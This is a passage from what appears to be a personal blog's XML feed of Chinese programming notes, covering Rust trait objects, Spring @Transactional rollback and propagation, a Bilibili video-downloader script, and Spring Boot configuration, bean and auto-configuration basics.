class_">Draw</span> <span class="keyword">for</span> <span class="title class_">Button</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Button: &#123;&#125;, &#123;&#125;, &#123;&#125;&quot;</span>, <span class="keyword">self</span>.width, <span class="keyword">self</span>.height, <span class="keyword">self</span>.label);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Image</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">    data: <span class="type">Vec</span>&lt;<span class="type">u8</span>&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Draw</span> <span class="keyword">for</span> <span class="title class_">Image</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Image: &#123;&#125;, &#123;&#125;, &#123;&#125;&quot;</span>, <span class="keyword">self</span>.width, <span class="keyword">self</span>.height, <span class="keyword">self</span>.data.<span class="title function_ invoke__">len</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">screen</span> = Screen &#123;</span><br><span class="line">        components: <span class="built_in">vec!</span>[</span><br><span class="line">            <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(Button &#123;</span><br><span class="line">                width: <span class="number">75</span>,</span><br><span class="line">                height: <span class="number">10</span>,</span><br><span class="line">                label: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;OK&quot;</span>),</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(Image &#123;</span><br><span class="line">                width: <span class="number">10</span>,</span><br><span class="line">                height: <span class="number">10</span>,</span><br><span class="line">                data: <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">            &#125;),</span><br><span class="line">        ],</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    screen.<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><ul>
<li>使用 Any 类型</li>
<li>使用第三方库，如<code>enum-dispatch</code>…</li>
</ul>
]]></content>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>事务-@transactional注解</title>
    <url>/2025/03/18/%E4%BA%8B%E5%8A%A1-transactional%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h2><p>事务是一组操作单元，是一个不可分割的工作单位，要么都执行，要么都不执行。保证数据的一致性和完整性。</p>
<h2 id="事务的特性"><a href="#事务的特性" class="headerlink" title="事务的特性"></a>事务的特性</h2><p>事务具有四个特性：ACID</p>
<ul>
<li><strong>原子性（Atomicity）</strong>：事务是一个不可分割的工作单位，要么都执行，要么都不执行。</li>
<li><strong>一致性（Consistency）</strong>：事务执行前后，数据的完整性保持一致。</li>
<li><strong>隔离性（Isolation）</strong>：多个事务之间互不干扰。</li>
<li><strong>持久性（Durability）</strong>：事务执行成功后，数据的修改是永久的。</li>
</ul>
<h2 id="Transactional注解"><a href="#Transactional注解" class="headerlink" title="@Transactional注解"></a>@Transactional注解</h2><p><code>@Transactional</code>注解用于声明一个方法需要事务支持，Spring会为这个方法创建一个事务代理，当方法执行时，如果抛出异常，则事务会回滚，否则事务会提交。</p>
<h3 id="Transactional注解的属性"><a href="#Transactional注解的属性" class="headerlink" title="@Transactional注解的属性"></a>@Transactional注解的属性</h3><ul>
<li><strong>rollbackFor</strong>：哪些异常会导致事务回滚，默认值是<code>RuntimeException</code>。</li>
<li><strong>propagation</strong>：事务的传播行为，默认值是<code>REQUIRED</code>。</li>
</ul>
<h4 id="rollbackFor属性"><a href="#rollbackFor属性" class="headerlink" title="rollbackFor属性"></a>rollbackFor属性</h4><p>rollbackFor属性的默认值是RuntimeException，所以默认情况下，只有RuntimeException及其子类会导致事务回滚，其他异常不会导致事务回滚。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteDepartment</span><span class="params">(Long id)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 删除部门</span></span><br><span class="line">    departmentMapper.deleteById(id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;删除员工失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除部门下的员工</span></span><br><span class="line">    employeeMapper.deleteByDepartmentId(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时，删除部门成功，但是删除员工失败，因为删除员工失败抛出的是Exception异常，而Exception不是RuntimeException的子类，所以不会导臿事务回滚，导致部门删除成功，员工删除失败。</p>
<p>如果想让删除员工失败时也回滚事务，可以将rollbackFor属性设置为Exception：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteDepartment</span><span class="params">(Long id)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 删除部门</span></span><br><span class="line">    departmentMapper.deleteById(id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;删除员工失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除部门下的员工</span></span><br><span class="line">    employeeMapper.deleteByDepartmentId(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，删除员工失败时会导致事务回滚，部门也不会删除。</p>
<h4 id="propagation属性"><a href="#propagation属性" class="headerlink" title="propagation属性"></a>propagation属性</h4><p>propagation属性用于设置事务的传播行为，有以下几种取值：</p>
<ul>
<li><strong>REQUIRED</strong>：如果当前没有事务，则创建一个新事务，如果当前有事务，则加入当前事务。</li>
<li><strong>REQUIRES_NEW</strong>：需要新事务，无论当前是否有事务，都会创建一个新事务。</li>
<li><strong>SUPPORTS</strong>：如果当前有事务，则加入当前事务，如果当前没有事务，则以非事务的方式执行。<br>…</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(String message)</span> &#123;</span><br><span class="line">    logMapper.insert(message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional(propagation = Propagation.REQUIRED)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteDepartment</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 删除部门</span></span><br><span class="line">        departmentMapper.deleteById(id);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> / <span class="number">0</span>; <span class="comment">// 抛出异常</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除部门下的员工</span></span><br><span class="line">        employeeMapper.deleteByDepartmentId(id);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 记录日志</span></span><br><span class="line">        log(<span class="string">&quot;删除部门：&quot;</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码需求为：无论是否删除部门成功，都要记录日志，如果删除部门失败，日志也要记录，所以需要使用REQUIRES_NEW传播行为，这样无论删除部门是否成功，都会记录日志。</p>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>bv-downloader</title>
    <url>/2025/03/23/bv-downloader/</url>
    <content><![CDATA[<h2 id="bv-downloader"><a href="#bv-downloader" class="headerlink" title="bv-downloader"></a>bv-downloader</h2><p>最近用大创经费买了一个硬盘，可以把之前想保存的视频都下载下来了，于是写了一个简单的脚本，可以自动化地下载b站上的合集视频。</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>项目地址：<a href="https://github.com/xudong7/bv-downloader">bv-downloader</a></li>
<li>语言：JavaScript</li>
</ul>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ol>
<li>依赖</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>运行</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure>

<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>主要分成三个模块：</p>
<ul>
<li>api</li>
<li>downloader</li>
<li>file-manager</li>
</ul>
<p>…</p>
]]></content>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot</title>
    <url>/2025/03/24/springboot/</url>
    <content><![CDATA[<h2 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h2><p>最近在学习springboot，记录一些学习笔记。</p>
<h3 id="配置优先级"><a href="#配置优先级" class="headerlink" title="配置优先级"></a>配置优先级</h3><p>springboot的配置优先级如下(从高到低)：</p>
<ol>
<li>命令行参数</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar app.jar --server.port=8080</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>java系统属性</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Dserver.port=8080 -jar app.jar</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>properties文件</li>
</ol>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>yml文件</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>yaml文件</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>


<h3 id="bean的获取"><a href="#bean的获取" class="headerlink" title="bean的获取"></a>bean的获取</h3><p>获取bean的方式有三种：</p>
<ol>
<li>通过名称获取</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> ApplicationContext applicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getBeanByName</span><span class="params">()</span> &#123;</span><br><span class="line">    applicationContext.getBean(<span class="string">&quot;beanName&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>通过类型获取</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> ApplicationContext applicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getBeanByType</span><span class="params">()</span> &#123;</span><br><span class="line">    applicationContext.getBean(BeanType.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>通过名称和类型获取</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> ApplicationContext applicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getBeanByNameAndType</span><span class="params">()</span> &#123;</span><br><span class="line">    applicationContext.getBean(<span class="string">&quot;beanName&quot;</span>, BeanType.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="bean的作用域"><a href="#bean的作用域" class="headerlink" title="bean的作用域"></a>bean的作用域</h3><p>bean的作用域有五种：</p>
<ol>
<li>singleton (默认)</li>
</ol>
<p>单例模式，一个容器只有一个实例。</p>
<ol start="2">
<li>prototype (非单例)</li>
</ol>
<p>原型模式，每次请求都会创建一个新的实例。</p>
<ol start="3">
<li>request (web环境)</li>
</ol>
<p>每次请求都会创建一个新的实例。</p>
<ol start="4">
<li>session (web环境)</li>
</ol>
<p>每次会话都会创建一个新的实例。</p>
<ol start="5">
<li>application (web环境)</li>
</ol>
<p>每次应用都会创建一个新的实例。</p>
<h4 id="如何设置bean的作用域"><a href="#如何设置bean的作用域" class="headerlink" title="如何设置bean的作用域"></a>如何设置bean的作用域</h4><p>通过注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@Scope(&quot;prototype&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrototypeBean</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="延迟初始化"><a href="#延迟初始化" class="headerlink" title="延迟初始化"></a>延迟初始化</h4><p>懒汉模式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Lazy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyBean</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动时不会创建bean，第一次使用时才会创建。</p>
<h3 id="第三方bean"><a href="#第三方bean" class="headerlink" title="第三方bean"></a>第三方bean</h3><p>springboot支持第三方bean的注入，只需要在配置类中添加<code>@bean</code>注解即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThirdPartyBeanConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ThirdPartyBean <span class="title function_">thirdPartyBean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThirdPartyBean</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何获取第三方bean：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> ApplicationContext applicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getThirdPartyBean</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">thirdPartyObject</span> <span class="operator">=</span> applicationContext.getBean(<span class="string">&quot;thirdPartyBean&quot;</span>); <span class="comment">// 可以通过方法名获取</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>@Componet 和 @Bean 的使用场景：</p>
<ol>
<li>@Component</li>
</ol>
<p>项目中自定义的，使用@Component及其衍生注解，如@Service、@Repository、@Controller等。</p>
<ol start="2">
<li>@Bean</li>
</ol>
<p>项目中引入的第三方bean，使用@Bean注解。</p>
<h2 id="springboot原理"><a href="#springboot原理" class="headerlink" title="springboot原理"></a>springboot原理</h2><p>springboot的核心是spring，springboot是对spring的封装，提供了一些便捷的功能。</p>
<h3 id="起步依赖"><a href="#起步依赖" class="headerlink" title="起步依赖"></a>起步依赖</h3><p>通过<strong>maven的依赖传递</strong>实现的，可以通过<code>spring-boot-starter-parent</code>来管理版本。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="自动配置"><a href="#自动配置" class="headerlink" title="自动配置"></a>自动配置</h3><p>springboot的自动配置就是当spring容器启动后，一些配置类、bean对象就自动存入到了IOC容器中，不需要我们手动配置，简化了开发。</p>
<h4 id="自动配置方案"><a href="#自动配置方案" class="headerlink" title="自动配置方案"></a>自动配置方案</h4><ol>
<li>@ComponentScan</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ComponentScan(&quot;com.example1&quot;, &quot;com.example2&quot;)</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>@SpringBootApplication</code>注解只能扫描当前包及其子包，如果需要扫描其他包，可以通过<code>@ComponentScan</code>注解，指定扫描其他包。</p>
<ol start="2">
<li>@Import</li>
</ol>
<ul>
<li>导入普通类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Import(BeanObject.class)</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>导入配置类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Import(BeanConfig.class)</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>导入ImportSelector接口实现类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Import(BeanImportSelector.class)</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanImportSelector</span> <span class="keyword">implements</span> <span class="title class_">ImportSelector</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] selectImports(AnnotationMetadata importingClassMetadata) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;BeanObject.class.getName()&#125;; <span class="comment">// or &#123;&quot;com.example.BeanObject&quot;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>@EnableXxxx注解，封装了@Import注解 (更加方便)</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// com.example.EnableSchedulingConfig</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Import(BeanImportSelector.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableScheduling &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanImportSelector</span> <span class="keyword">implements</span> <span class="title class_">ImportSelector</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] selectImports(AnnotationMetadata importingClassMetadata) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;BeanObject.class.getName()&#125;; <span class="comment">// or &#123;&quot;com.example.BeanObject&quot;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableSchedulingConfig</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="自动配置原理"><a href="#自动配置原理" class="headerlink" title="自动配置原理"></a>自动配置原理</h3><p><code>@SpringBootApplication</code>注解由三个部分组成：</p>
<ol>
<li><p><code>@SpringBootConfiguration</code>：标注当前类是一个配置类，继承自@Configuration。</p>
</li>
<li><p><code>@ComponentScan</code>：扫描当前包及其子包下的所有组件。</p>
</li>
<li><p><strong><code>@EnableAutoConfiguration</code></strong>：开启自动配置功能。(<strong>核心</strong>)</p>
</li>
</ol>
<p><code>@EnableAutoConfiguration</code>注解的原理：</p>
<ol>
<li><p><code>@Import(AutoConfigurationImportSelector.class)</code>：导入AutoConfigurationImportSelector类。</p>
</li>
<li><p>AutoConfigurationImportSelector类的selectImports方法：</p>
</li>
</ol>
<ul>
<li>获取所有的自动配置类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> List&lt;String&gt; <span class="title function_">getCandidateConfigurations</span><span class="params">(AnnotationMetadata metadata, AnnotationAttributes attributes)</span> &#123;</span><br><span class="line">    List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(getSpringFactoriesLoaderFactoryClass(), getBeanClassLoader());</span><br><span class="line">    Assert.notEmpty(configurations, <span class="string">&quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> configurations;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过SpringFactoriesLoader.loadFactoryNames方法获取所有的自动配置类。</p>
<h3 id="Conditional注解"><a href="#Conditional注解" class="headerlink" title="@Conditional注解"></a>@Conditional注解</h3><p><code>@Conditional</code>注解是springboot提供的一个条件注解，用于判断是否满足某个条件，满足条件才会加载bean到IOC容器中。</p>
<ul>
<li><p><code>@ConditionalOnMissingBean</code>：当容器中没有指定的bean时，才会加载当前bean。</p>
</li>
<li><p><code>@ConditionalOnClass</code>：当类路径下有指定的类时，才会加载当前bean。</p>
</li>
<li><p><code>@ConditionalOnProperty</code>：当配置文件中有指定的属性时，才会加载当前bean。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(name = &quot;com.example.BeanObject2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> BeanObject <span class="title function_">beanObject</span><span class="params">()</span> &#123; <span class="comment">// 当环境中存在BeanObject2类时，才会加载当前bean</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BeanObject</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(name = &quot;com.example.BeanObject2&quot;)</span> <span class="comment">// 指定类型(value属性)或名称(name属性)</span></span><br><span class="line"><span class="keyword">public</span> BeanObject <span class="title function_">beanObject</span><span class="params">()</span> &#123; <span class="comment">// 当环境中不存在BeanObject2类时，才会加载当前bean</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BeanObject</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(name = &quot;spring.datasource.url&quot;)</span> <span class="comment">// 当配置文件中存在spring.datasource.url属性时，才会加载当前bean</span></span><br><span class="line"><span class="keyword">public</span> BeanObject <span class="title function_">beanObject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BeanObject</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>spring boot</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot starter diy</title>
    <url>/2025/03/25/springboot-starter-diy/</url>
    <content><![CDATA[<h2 id="使用自定义的springboot-starter"><a href="#使用自定义的springboot-starter" class="headerlink" title="使用自定义的springboot starter"></a>使用自定义的springboot starter</h2><p>e.g. 以阿里云oss为例，自定义一个starter，方便在项目中使用</p>
<h3 id="1-创建aliyun-oss-spring-boot-starter项目"><a href="#1-创建aliyun-oss-spring-boot-starter项目" class="headerlink" title="1. 创建aliyun-oss-spring-boot-starter项目"></a>1. 创建aliyun-oss-spring-boot-starter项目</h3><p>文件夹中只保留pom.xml和.iml(idea配置文件)</p>
<p>如果没有.iml，可以运行mvn idea:module生成</p>
<h3 id="2-创建aliyun-oss-spring-boot-starter-autoconfigure项目"><a href="#2-创建aliyun-oss-spring-boot-starter-autoconfigure项目" class="headerlink" title="2. 创建aliyun-oss-spring-boot-starter-autoconfigure项目"></a>2. 创建aliyun-oss-spring-boot-starter-autoconfigure项目</h3><p>在starter中的pom.xml中添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun.oss<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-oss-spring-boot-autoconfigue<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/image22.png" alt="alt text"></p>
<h3 id="3-将AliOSSUtils类放入autoconfigure项目中"><a href="#3-将AliOSSUtils类放入autoconfigure项目中" class="headerlink" title="3. 将AliOSSUtils类放入autoconfigure项目中"></a>3. 将AliOSSUtils类放入autoconfigure项目中</h3><p><img src="/images/image23.png" alt="alt text"></p>
<p>发现MultipartFile报错，因为没有引入spring-boot-starter-web依赖</p>
<p>在autoconfigure项目中的pom.xml中添加依赖即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

